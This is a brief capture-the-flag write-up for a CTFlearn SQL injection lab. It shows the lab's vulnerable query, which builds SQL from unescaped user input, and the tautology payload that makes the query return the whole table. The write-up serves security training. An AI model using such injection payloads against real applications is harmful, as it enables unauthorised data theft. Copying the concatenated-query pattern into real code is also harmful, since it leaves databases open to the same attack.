[SQL Injection Part 1](https://ctflearn.com/lab/sql-injection-part-1)

# Description

See if you can leak the whole database using what you know about SQL Injections.

# Solution

Original Query: `SELECT \* FROM webfour.webfour where name = '$input'`

**To bypass it use this:**

```sql
' OR '1' = '1
```
